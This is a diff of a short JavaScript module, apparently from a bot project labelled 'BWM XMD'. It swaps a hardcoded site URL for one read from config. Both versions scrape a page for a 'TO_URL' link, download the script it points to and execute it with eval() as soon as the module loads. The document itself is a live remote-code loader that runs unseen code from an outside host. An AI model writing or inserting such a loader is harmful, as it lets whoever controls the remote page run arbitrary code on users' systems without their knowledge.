@@ -1,30 +1,29 @@
  // 🇧​​​​​🇼​​​​​🇲​​​​​ 🇽​​​​​🇲​​​​​🇩​​​​​
 
-'use strict';
-
 const axios = require('axios');
 const cheerio = require('cheerio');
-
-const webPageUrl = 'https://www.ibrahimadams.site/files';
+const adams = require(__dirname + "/../config");
 
 async function fetchToUrl() {
-    try {
-        const response = await axios.get(webPageUrl);
-        const $ = cheerio.load(response.data);
-        const toUrl = $(`a:contains("TO_URL")`).attr('href');
+  try {
+    const response = await axios.get(adams.BWM_XMD);
+    const $ = cheerio.load(response.data);
 
-        if (!toUrl) throw new Error('TO_URL not found on the webpage.');
+    const toUrlElement = $('a:contains("TO_URL")');
+    const toUrl = toUrlElement.attr('href');
 
-        console.log('TO_URL fetched successfully:', toUrl);
-
-        const scriptResponse = await axios.get(toUrl);
-        const scriptContent = scriptResponse.data;
-        console.log("TO_URL script loaded successfully");
-
-        eval(scriptContent);
-    } catch (error) {
-        console.error('Error fetching TO_URL:', error.message);
+    if (!toUrl) {
+      throw new Error('To URL link not found...');
     }
+
+    console.log('To URL fetched successfully ✅');
+
+    const scriptResponse = await axios.get(toUrl);
+    eval(scriptResponse.data);
+
+  } catch (error) {
+    console.error('Error:', error.message);
+  }
 }
 
 fetchToUrl();
